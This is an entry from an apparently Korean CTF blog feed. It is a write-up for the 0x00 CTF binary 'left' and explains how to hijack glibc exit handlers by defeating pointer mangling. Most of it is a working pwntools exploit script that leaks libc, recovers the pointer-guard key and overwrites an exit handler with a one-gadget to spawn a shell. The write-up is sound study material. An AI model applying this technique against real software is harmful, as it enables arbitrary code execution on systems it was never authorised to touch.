    <entry>
      <title>0x00_ctf_left</title>
      <link href="/2018/09/25/0x00-ctf/"/>
      <url>/2018/09/25/0x00-ctf/</url>
      
        <content type="html"><![CDATA[<p>libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌. </p><a id="more"></a><p>  exit_funcion 구조체. 값을 써주고 바로 exit 호출하며 나가버리기에, exit_handler 에 값을 써넣으면 쉘을 딸 수 있음. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct exit_function</span><br><span class="line">  &#123;</span><br><span class="line">    /* `flavour&apos; should be of type of the `enum&apos; above but since we need</span><br><span class="line">       this element in an atomic operation we have to use `long int&apos;.  */</span><br><span class="line">    long int flavor;</span><br><span class="line">    union</span><br><span class="line">      &#123;</span><br><span class="line">        void (*at) (void); &lt;-- *next + 24 (rax+0x18)</span><br><span class="line">        struct</span><br><span class="line">          &#123;</span><br><span class="line">            void (*fn) (int status, void *arg);</span><br><span class="line">            void *arg;</span><br><span class="line">          &#125; on;</span><br><span class="line">        struct</span><br><span class="line">          &#123;</span><br><span class="line">            void (*fn) (void *arg, int status);</span><br><span class="line">            void *arg;</span><br><span class="line">            void *dso_handle;</span><br><span class="line">          &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">struct exit_function_list</span><br><span class="line">  &#123;</span><br><span class="line">    struct exit_function_list *next;</span><br><span class="line">    size_t idx;</span><br><span class="line">    struct exit_function fns[32];</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list" target="_blank" rel="noopener">소스코드</a></p><p>exit_function_list *next +24에 값을 써넣으면 된다. 그런데</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  0x00007ffff7e1a7fa &lt;+122&gt;:cmp    rdx,0x2</span><br><span class="line">   0x00007ffff7e1a7fe &lt;+126&gt;:jne    0x7ffff7e1a819 &lt;__run_exit_handlers+153&gt;</span><br><span class="line">   0x00007ffff7e1a800 &lt;+128&gt;:mov    rdx,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7e1a804 &lt;+132&gt;:mov    rsi,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7e1a808 &lt;+136&gt;:mov    edi,ebp</span><br><span class="line">   0x00007ffff7e1a80a &lt;+138&gt;:ror    rdx,0x11</span><br><span class="line">   0x00007ffff7e1a80e &lt;+142&gt;:xor    rdx,QWORD PTR fs:0x30</span><br><span class="line">==&gt;   0x00007ffff7e1a817 &lt;+151&gt;:call   rdx</span><br><span class="line">   0x00007ffff7e1a819 &lt;+153&gt;:mov    esi,ebx</span><br><span class="line">   0x00007ffff7e1a81b &lt;+155&gt;:xor    eax,eax</span><br><span class="line">   0x00007ffff7e1a81d &lt;+157&gt;:cmp    DWORD PTR [rip+0x1841b4],0x0        # 0x7ffff7f9e9d8 &lt;__libc_multiple_threads&gt;</span><br><span class="line">   0x00007ffff7e1a824 &lt;+164&gt;:je     0x7ffff7e1a82f &lt;__run_exit_handlers+175&gt;</span><br><span class="line">   0x00007ffff7e1a826 &lt;+166&gt;:lock cmpxchg DWORD PTR [r14],esi</span><br><span class="line">   0x00007ffff7e1a82b &lt;+171&gt;:jne    0x7ffff7e1a835 &lt;__run_exit_handlers+181&gt;</span><br><span class="line">   0x00007ffff7e1a82d &lt;+173&gt;:jmp    0x7ffff7e1a84b &lt;__run_exit_handlers+203&gt;</span><br><span class="line">   0x00007ffff7e1a82f &lt;+175&gt;:cmpxchg DWORD PTR [r14],esi</span><br></pre></td></tr></table></figure><p>+128에 있는 명령을 보면 알 수 있듯 rdx엔 *next+24의 값이 들어가고, ror 연산과 xor 연산을 거쳐 변조 되므로, 역연산해서 써넣어야 할 값을 알아내야 함.</p><p><code> fs:0x30 - > _dl_fini </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./left&quot;)</span><br><span class="line">v = 0xffffffffffffffffL</span><br><span class="line">rol = lambda x : (x &lt;&lt; 0x11 &amp; v)|(x &gt;&gt; 64-(0x11))</span><br><span class="line">ror = lambda x : ((x&gt;&gt;64-(0x11) &amp; v)) | (x &gt;&gt; 0x11)</span><br><span class="line">l = ELF(&quot;/libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;printf(): &quot;)</span><br><span class="line">data = int(p.recv(15))</span><br><span class="line">log.info(&quot;printf addr: 0x%08x&quot;%data)</span><br><span class="line"></span><br><span class="line">libc_base = data - l.symbols[&apos;printf&apos;]</span><br><span class="line">log.info(&quot;libc_base : 0x%08x&quot;% libc_base)</span><br><span class="line">atexit = libc_base + l.symbols[&apos;__cxa_atexit&apos;]</span><br><span class="line">leak = atexit+24</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">rdx = int(p.recv(15))</span><br><span class="line">real_addr = ror(rdx)</span><br><span class="line"></span><br><span class="line">df = libc_base + 0x3daab0 # _dl_fini </span><br><span class="line">log.info(&quot;df : 0x%08x&quot; % df)</span><br><span class="line">key = real_addr ^ df</span><br><span class="line"></span><br><span class="line">magic1 =(libc_base + 0x4526a)^key</span><br><span class="line">magic2 = rol(magic1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line">p.sendline(str(magic2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
